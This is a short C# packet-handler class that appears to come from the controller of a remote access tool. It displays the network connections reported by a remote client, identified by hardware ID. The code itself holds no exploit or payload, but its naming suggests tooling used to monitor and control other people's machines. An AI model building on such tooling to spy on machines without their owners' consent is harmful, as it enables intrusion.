using System.Windows.Forms;
using MessagePackLib.MessagePack;
using Server.Connection;
using Server.Forms;

namespace Server.Handle_Packet;

public class HandleNetstat
{
	public void GetProcess(Clients client, MsgPack unpack_msgpack)
	{
		try
		{
			FormNetstat formNetstat = (FormNetstat)Application.OpenForms["Netstat:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
			if (formNetstat != null)
			{
				if (formNetstat.Client == null)
				{
					formNetstat.Client = client;
					formNetstat.timer1.Enabled = true;
				}
				string asString = unpack_msgpack.ForcePathObject("Message").AsString;
				formNetstat.LoadStates(asString);
			}
		}
		catch
		{
		}
	}
}
